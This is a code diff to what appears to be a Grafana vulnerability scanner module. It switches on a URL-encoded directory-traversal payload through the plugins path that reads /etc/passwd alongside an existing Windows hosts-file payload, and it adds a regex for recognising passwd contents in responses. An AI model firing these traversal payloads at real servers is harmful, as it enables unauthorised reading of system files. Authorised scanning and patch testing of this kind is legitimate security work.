@@ -20,6 +20,7 @@ from lib.tool.thread import thread
 from lib.tool import check
 from thirdparty import requests
 from time import sleep
+import re
 
 class Grafana():
     def __init__(self):
@@ -44,10 +45,10 @@ class Grafana():
                 'path': 'public/plugins/{}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/C:\Windows\System32\drivers\etc\hosts',
                 'data': ''
             },
-            # {
-            #     'path': 'plugins/{}/../../../../../../../../../../../../../etc/passwd',
-            #     'data': ''
-            # },
+            {
+                'path': 'plugins/{}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+                'data': ''
+            },
             # {
             #     'path': '{}/../../../../../../../../../../../../../etc/passwd',
             #     'data': ''
@@ -110,10 +111,9 @@ class Grafana():
                     )
                     logger.logging(vul_info, res.status_code, res)                        # * LOG
 
-                    if (('/sbin/nologin' in res.text) 
-                        or ('root:x:0:0:root' in res.text) 
-                        or ('Microsoft Corp' in res.text) 
-                        or ('Microsoft TCP/IP for Windows' in res.text)
+                    if (re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res.text, re.I|re.M|re.S)
+                        or (('Microsoft Corp' in res.text) 
+                            and ('Microsoft TCP/IP for Windows' in res.text))
                     ):
                         results = {
                             'Target': res.request.url,
